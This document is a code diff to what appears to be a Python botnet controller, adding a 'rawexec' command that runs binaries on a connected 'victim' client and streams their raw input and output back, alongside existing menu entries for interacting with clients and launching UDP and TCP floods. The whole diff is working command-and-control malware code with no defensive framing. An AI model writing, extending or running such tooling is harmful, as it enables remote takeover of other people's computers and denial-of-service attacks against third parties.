@@ -25,6 +25,8 @@
 import os
 import sys
 import socket
+import re
+import threading
 
 intro = r"""
  ____ ____ ____ ____ ____ ____ ____ ____
@@ -51,6 +53,7 @@ help                    | Show this message
 Client Interaction:
 -------------------
 interact <id>           | Interact with client
+rawexec                 | Execute a binary and pipe the raw I/O to the controller
 stop                    | Stop interacting with client
 udpflood <ip>:<port>    | UDP flood with client
 tcpflood <ip>:<port>    | TCP flood with client
@@ -90,6 +93,19 @@ else:
     password = '1234'
     print("Using default values - {}:{}, password:{}".format(host, port, password))
 
+def send_msg(sock, sem):
+    while True:
+        data = sys.stdin.readline()
+        if sem.acquire(False):
+            return
+        sock.send(bytes(data, 'utf-8'))
+
+def recv_msg(sock):
+    while True:
+        data = sock.recv(20480).decode()
+        if data == 'stop': return
+        sys.stdout.write(data)
+
 def main():
     print(intro)
     try:
@@ -116,18 +132,32 @@ def main():
                     victimpath = s.recv(20480).decode()
                     if "ERROR" not in victimpath:
                         breakit = False
-                        while breakit == False:
+                        while not breakit:
                             msg = input(victimpath)
-                            allofem = msg.split(";")
-                            for onebyone in allofem: #This your happy day one liners
+                            allofem = re.split(''';(?=(?:[^'"]|'[^']*'|"[^"]*")*$)''', msg)
+                            for onebyone in allofem:
                                 if onebyone == "stop":
                                     s.send(bytes("stop", 'utf-8'))
                                     print("\n")
                                     breakit = True
+                                elif "rawexec" in onebyone:
+                                    sem = threading.Semaphore()
+                                    sem.acquire(False)
+                                    s.send(bytes(onebyone, 'utf-8'))
+                                    sender = threading.Thread(target=send_msg, args=(s, sem,))
+                                    recver = threading.Thread(target=recv_msg, args=(s,))
+                                    sender.daemon = True
+                                    recver.daemon = True
+                                    sender.start()
+                                    recver.start()
+                                    while threading.active_count() > 2:
+                                        pass
+                                    sem.release()
                                 elif "cd " in onebyone:
                                     s.send(bytes(onebyone, 'utf-8'))
                                     temp = s.recv(20480).decode()
-                                    if "ERROR" not in temp: victimpath = temp
+                                    if "ERROR" not in temp:
+                                        victimpath = temp
                                     else: print(temp)
                                 elif onebyone == "":
                                     print("[CONTROLLER] Nothing to be sent...\n")
